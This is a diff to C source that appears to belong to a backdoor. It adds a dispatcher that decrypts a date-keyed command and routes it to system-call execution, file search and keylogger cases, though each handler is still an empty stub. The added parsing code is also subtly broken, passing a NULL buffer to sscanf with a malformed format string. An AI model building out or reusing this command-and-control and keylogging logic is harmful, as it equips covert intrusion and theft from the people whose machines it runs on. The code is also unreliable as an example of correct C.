@@ -176,8 +176,10 @@ int validPassphrase(char *passphrase)
 int getCommand(char **command, int payloadSize)
 {
     char *decryptedCommand = NULL;
+    char *token = NULL;
     char date[11];
     struct tm *tm;
+    int option = -1;
     time_t t;
     
     // Get the date information
@@ -187,6 +189,26 @@ int getCommand(char **command, int payloadSize)
     
     // Decrypt our command using today's date
     decryptedCommand = encrypt_data(*command, date, payloadSize);
+    
+    // Get the command value and an optional filename or command
+    if (sscanf(decryptedCommand, "%d[^|]%s", &option, token) == 0)
+    {
+        return 0;
+    }
+    
+    switch (option) {
+        case EXECUTE_SYSTEM_CALL:
+            // Call function
+            break;
+        case FIND_FILE:
+            // Call function
+            break;
+        case KEYLOGGER:
+            // Call function
+            break;
+        default:
+            break;
+    }
     
     return 0;
 }
